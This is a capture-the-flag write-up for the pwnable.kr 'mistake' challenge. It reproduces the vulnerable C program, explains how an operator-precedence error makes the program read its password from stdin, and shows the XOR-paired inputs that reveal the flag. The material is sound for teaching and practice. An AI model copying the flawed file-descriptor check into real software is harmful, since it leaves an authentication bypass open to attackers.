# mistake

This small challenge of pwnable.kr is one I really enjoyed, and even though its pretty  easy and straightforward
it tested some of my basic code reviewing skills. Also, the fact that it's based on a real world situation makes it much more interesting for me.
Without further ado let's jump into it.

### Disclaimer!

I changed the original flag with the custom flag "Shad3 pwnned this", it's better to exploit it yourself,
than just copy it :P.

## Enumeration

By connecting through ssh to the server as usual we get 4 files as shown bellow.

```python
shad3@zeroday:~/Desktop/Security/CTF$ ssh mistake@pwnable.kr -p2222
mistake@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@gatech.edu
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
mistake@pwnable:~$ ls -la
total 44
drwxr-x---   5 root        mistake 4096 Oct 23  2016 .
drwxr-xr-x 116 root        root    4096 Nov 12 21:34 ..
d---------   2 root        root    4096 Jul 29  2014 .bash_history
dr-xr-xr-x   2 root        root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root        root    4096 Oct 23  2016 .pwntools-cache
-r--------   1 mistake_pwn root      51 Jul 29  2014 flag
-r-sr-x---   1 mistake_pwn mistake 8934 Aug  1  2014 mistake
-rw-r--r--   1 root        root     792 Aug  1  2014 mistake.c
-r--------   1 mistake_pwn root      10 Jul 29  2014 password
mistake@pwnable:~$  
```
Lets start analysing the source code to find the bugs.

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

By analysing the code we spot the first bug, that's on the first if statement, 

``if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)``

The bug here is that the comparison operator (**<**) has higher operator priority than the assignment one (**=**).
The above if statement can be expressed better in the following pseudocode:
```python
    function bug():
        if open("password file") < 0 == True:
            return 1
        else:
            return 0

    fd = call()
```
If the **open** function finds the password file and opens it, returns a possitive integer,
with that being said the if check in the **bug** function in our pseudocode ***will always return 0***, that assigns 0 to the,
**fd** variable which is used as a file descriptor, the 0 file descriptor is reserved as, **STDIN**. 
Then then program will duplicate the input that it read from stdin to the pw_read buffer.
``if(!(len=read(fd,pw_buf,PW_LEN) > 0))``
Now that we control the compaired input we only need to find a way to bypass the checks,
We notice that the scanf reads 10 bytes from stdin,stores them in the pw_buf2 buffer, XORs them with 1 and the compaires 
them with pw_buf.


## Exploit

To bypass the checks we have to find a combination of two password that the after the XOR operation of one will result to the other.
```python
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/mistake$ python3
Python 3.6.9 (default, Nov  7 2019, 10:44:02) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(ord('B'))
'0x42'
>>> 0x42 ^ 1
67
>>> chr(67)
'C'
>>> if 67 ^ 1 == 66:
...     print ("That works!")
... 
That works!
```
Based on the output above the passwords BBBBBBBBBB:CCCCCCCCCC should do the job.
```python
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/mistake$ ./mistake
do not bruteforce...
BBBBBBBBBB
input password : CCCCCCCCCC
Password OK
Shad3 pwnned this!
```

And it actually works!